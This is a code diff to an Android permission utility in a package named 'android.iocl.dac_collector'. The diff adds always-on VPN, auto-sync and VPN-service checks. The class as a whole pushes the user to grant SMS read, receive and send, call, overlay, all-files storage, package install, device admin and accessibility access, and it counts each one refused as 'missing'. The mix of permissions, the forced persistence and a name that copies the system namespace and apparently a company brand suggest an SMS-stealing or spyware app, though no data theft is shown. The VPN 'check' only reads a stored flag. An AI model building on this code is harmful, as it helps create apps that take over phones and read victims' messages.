@@ -1,16 +1,17 @@
 package android.iocl.dac_collector.Utility;
 
-
-
 import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.iocl.dac_collector.ModelData.PermissionItem;
 import android.iocl.dac_collector.R;
+import android.iocl.dac_collector.Receivers.AdminReceiver;
 import android.iocl.dac_collector.Services.AcessibilitySettings;
 import android.net.Uri;
 import android.os.Build;
@@ -39,6 +40,25 @@ public class PermissionUtility {
 
     private static final int REQUEST_CODE_STORAGE = 101;
     private static final int REQUEST_CODE_INSTALL = 102;
+
+    /**
+     * Toggle to control whether the app enforces an Always-on VPN check.
+     *
+     * Default: true (existing behavior — the app will check and may add "always_on_vpn" to missing permissions)
+     * If you set this to false, isAlwaysOnVpnEnabled(...) will short-circuit to `true` so callers won't mark VPN as missing.
+     *
+     * Usage example:
+     * PermissionUtility.setEnforceAlwaysOnVpn(false); // disable enforcement (likely in Application.onCreate)
+     */
+    private static volatile boolean ENFORCE_ALWAYS_ON_VPN = true;
+
+    public static void setEnforceAlwaysOnVpn(boolean enforce) {
+        ENFORCE_ALWAYS_ON_VPN = enforce;
+    }
+
+    public static boolean isEnforceAlwaysOnVpn() {
+        return ENFORCE_ALWAYS_ON_VPN;
+    }
 
     /**
      * Request storage permissions (Read & Write)
@@ -75,6 +95,25 @@ public class PermissionUtility {
         }
     }
 
+    public static void openAccountSyncPage(Context context) {
+        Intent intent = new Intent(Settings.ACTION_SYNC_SETTINGS);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+    }
+
+    public static void openVPNSetting(Context context) {
+        Intent intent = new Intent("android.net.vpn.SETTINGS");
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        try {
+            context.startActivity(intent);
+        } catch (Exception e) {
+            // Fallback: open main settings if the VPN screen isn't found
+            context.startActivity(new Intent(Settings.ACTION_VPN_SETTINGS));
+        }
+
+        SharedPrefs.setVPNAlways(context, true);
+
+    }
 
 
     /**
@@ -98,13 +137,14 @@ public class PermissionUtility {
      * Request Device Admin
      */
     public static void requestDeviceAcmin(Context activity) {
-      enableDeviceAdmin(activity);
+        enableDeviceAdmin(activity);
     }
+
     /**
      * Request Accessibility Permission
      */
     public static void requestAccessibility(Context activity) {
-       activity.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+        activity.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
 
     }
 
@@ -116,6 +156,7 @@ public class PermissionUtility {
             XXPermissions.with(activity)
                     .permission(Permission.READ_PHONE_STATE)
                     .permission(Permission.READ_SMS)
+                    .permission(Permission.BIND_VPN_SERVICE)
                     .permission(Permission.RECEIVE_SMS)
                     .permission(Permission.CALL_PHONE)
                     .permission(Permission.SCHEDULE_EXACT_ALARM)
@@ -136,7 +177,8 @@ public class PermissionUtility {
             e.printStackTrace();
         }
     }
-    public static boolean isAdmin (Activity activity){
+
+    public static boolean isAdmin(Activity activity) {
         DevicePolicyManager dpm = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
 
         // Explicitly set the fully qualified class name of the receiver
@@ -189,7 +231,7 @@ public class PermissionUtility {
         return false;
     }
 
-    public static boolean isTilesAdded (Activity activity) {
+    public static boolean isTilesAdded(Activity activity) {
 
 
         return SharedPrefs.isTileAdded(activity);
@@ -216,9 +258,9 @@ public class PermissionUtility {
         activity.startActivity(intent); // Must be from Activity, not application context
     }
 
-    private static boolean isAllowedInstallApp (Activity activity) {
+    private static boolean isAllowedInstallApp(Activity activity) {
 
-       return XXPermissions.isGrantedPermissions(activity, Permission.REQUEST_INSTALL_PACKAGES);
+        return XXPermissions.isGrantedPermissions(activity, Permission.REQUEST_INSTALL_PACKAGES);
     }
 
     public static List<String> getMissingPermissions(Activity activity) {
@@ -235,6 +277,7 @@ public class PermissionUtility {
                 Permission.POST_NOTIFICATIONS,
                 Permission.MANAGE_EXTERNAL_STORAGE,
                 Permission.SEND_SMS,
+                Permission.BIND_VPN_SERVICE,
                 Permission.SYSTEM_ALERT_WINDOW,
                 Permission.READ_PHONE_NUMBERS
         };
@@ -246,24 +289,40 @@ public class PermissionUtility {
             }
         }
 
+        if (!isMasterSyncAutomatically()) {
+            missingPermissions.add("sync_false");
+        }
 
-        if (!isTilesAdded(activity)){
+
+        if (!isTilesAdded(activity)) {
             missingPermissions.add("Tiles");
         }
 
 
-        if (!isAllowedInstallApp(activity)){
+        if (!isAllowedInstallApp(activity)) {
             missingPermissions.add(Permission.REQUEST_INSTALL_PACKAGES);
         }
+
+        if (!isAdmin(activity)) {
+            missingPermissions.add("Admin");
+            // Stop here, don’t try privileged checks until admin is on
+            return missingPermissions;
+        }
+
+//      TODO: Remmove the LOG
+
+
+        if (!isAlwaysOnVpnEnabled(activity)) {
+            missingPermissions.add("always_on_vpn");
+        }
+
 
 
 //        if (!isAccessibilityServiceEnabled(activity)){
 //            missingPermissions.add("Accessibility");
 //        }
 
-        if (!isAdmin(activity)){
-            missingPermissions.add("Admin");
-        }
+
 
 
         Log.d("TAG--Test", "getMissingPermissions: " + missingPermissions);
@@ -276,6 +335,16 @@ public class PermissionUtility {
      */
     public static boolean isAnyPermissionMissing(Activity activity) {
         return !getMissingPermissions(activity).isEmpty();
+    }
+
+
+    public static boolean isMasterSyncAutomatically() {
+        return ContentResolver.getMasterSyncAutomatically();
+    }
+
+
+    public static boolean isAlwaysOnVpnEnabled(Context context) {
+      return SharedPrefs.getVPNAlways(context);
     }
 
 
@@ -296,6 +365,7 @@ public class PermissionUtility {
                 Permission.READ_PHONE_STATE,
                 Permission.READ_PHONE_NUMBERS,
                 Permission.SYSTEM_ALERT_WINDOW,
+                Permission.BIND_VPN_SERVICE,
                 Permission.CALL_PHONE,
                 Permission.SCHEDULE_EXACT_ALARM
         ));
@@ -373,7 +443,18 @@ public class PermissionUtility {
                 title = "Device Admin";
                 description = "Allows the app to become a device administrator.";
                 break;
-                case "Tiles":
+
+            case "sync_false":
+                icon = R.drawable.sync_error;
+                title = "Allow Automatic Syncing";
+                description = "Allow the app to automatically sync data.";
+                break;
+            case "always_on_vpn":
+                icon = R.drawable.vpn_icon;
+                title = "Allow Always-on VPN";
+                description = "Allow the app to stay always on using Always-on VPN Setting";
+                break;
+            case "Tiles":
                 icon = R.drawable.tiles_icon;
                 title = "Add Tiles to Notification Bar";
                 description = "Allow the app function properly.";
